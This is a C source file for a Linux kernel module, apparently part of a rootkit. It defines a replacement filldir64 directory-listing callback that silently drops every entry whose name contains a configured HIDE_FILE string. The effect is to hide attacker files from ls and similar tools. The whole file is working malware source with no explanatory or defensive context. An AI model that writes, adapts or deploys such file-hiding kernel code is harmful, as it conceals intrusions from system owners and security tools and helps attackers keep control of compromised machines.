#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>

#include "config.h"

#define ROUND_UP64(x) (((x)+sizeof(u64)-1) & ~(sizeof(u64)-1))
#define NAME_OFFSET(de) ((int) ((de)->d_name - (char __user *) (de)))

struct getdents_callback64 {
        struct linux_dirent64 __user * current_dir;
        struct linux_dirent64 __user * previous;
        int count;
        int error;
};

int new_filldir64(void * __buf, const char * name, int namlen, loff_t offset,
                     ino_t ino, unsigned int d_type)
{
        struct linux_dirent64 __user *dirent;
        struct getdents_callback64 * buf = (struct getdents_callback64 *) __buf;
        int reclen = ROUND_UP64(NAME_OFFSET(dirent) + namlen + 1);

        buf->error = -EINVAL;   /* only used if we fail.. */
        if (reclen > buf->count)
                return -EINVAL;
        dirent = buf->previous;
        if (dirent) {
                if (strstr(name, HIDE_FILE) != NULL) {
                        return 0;
                }

                if (__put_user(offset, &dirent->d_off))
                        goto efault;
        }
        dirent = buf->current_dir;

        if (strstr(name, HIDE_FILE) != NULL) {
                return 0;
        }

        if (__put_user(ino, &dirent->d_ino))
                goto efault;
        if (__put_user(0, &dirent->d_off))
                goto efault;
        if (__put_user(reclen, &dirent->d_reclen))
                goto efault;
        if (__put_user(d_type, &dirent->d_type))
                goto efault;
        if (copy_to_user(dirent->d_name, name, namlen))
                goto efault;
        if (__put_user(0, dirent->d_name + namlen))
                goto efault;
        buf->previous = dirent;
        dirent = (void __user *)dirent + reclen;
        buf->current_dir = dirent;
        buf->count -= reclen;
        return 0;
efault:
        buf->error = -EFAULT;
        return -EFAULT;
}

